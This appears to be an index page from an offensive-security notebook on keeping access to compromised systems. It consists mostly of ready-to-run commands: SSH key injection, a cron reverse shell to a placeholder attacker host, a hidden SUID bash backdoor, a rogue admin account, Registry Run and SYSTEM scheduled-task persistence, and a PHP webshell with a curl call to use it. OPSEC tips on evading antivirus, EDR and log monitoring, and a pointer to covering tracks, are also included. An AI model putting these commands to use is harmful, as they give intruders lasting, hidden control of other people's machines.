---
tags: [persistence, index]
---

# Persistence — Index

## Notes in This Section

| Note | Content |
|------|---------|
| [[08-Persistence/Linux-Persistence]] | SSH keys, cron, systemd, bashrc, SUID backdoor |
| [[08-Persistence/Windows-Persistence]] | Admin user, registry Run, scheduled tasks, WMI, service |
| [[08-Persistence/Web-Persistence]] | Webshells (PHP/JSP/ASPX), CMS backdoors |

## Quick Persistence — Linux

```bash
# SSH key injection
echo "ssh-ed25519 AAAA..." >> ~/.ssh/authorized_keys

# Cron reverse shell (every minute)
echo "* * * * * bash -i >& /dev/tcp/<lhost>/4444 0>&1" | crontab -

# SUID bash backdoor
cp /bin/bash /tmp/.hidden; chmod +s /tmp/.hidden
# Use: /tmp/.hidden -p
```

## Quick Persistence — Windows

```powershell
# Add admin user
net user hacker P@ss123 /add; net localgroup administrators hacker /add

# Registry Run key
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v svc /t REG_SZ /d "C:\Temp\shell.exe" /f

# Scheduled task
schtasks /create /tn "Update" /tr "C:\Temp\shell.exe" /sc minute /mo 5 /ru SYSTEM
```

## Quick Persistence — Web

```php
# Minimal PHP webshell
<?php system($_GET['cmd']); ?>

# Upload, access via:
curl "http://<target>/uploads/shell.php?cmd=id"
```

## OPSEC Notes

- **Linux**: Cron is very noisy — prefer SSH keys for quiet persistence
- **Windows**: Services and Run keys are checked by most AV/EDR — prefer scheduled tasks with SYSTEM privileges or WMI event subscriptions
- **Web**: Avoid placing shells in webroot if logs are monitored — prefer non-obvious paths

## Related

- [[09-Covering-Tracks/INDEX]] — Remove after persistence is established
- [[06-Post-Exploitation/INDEX]] — Context: when to establish persistence
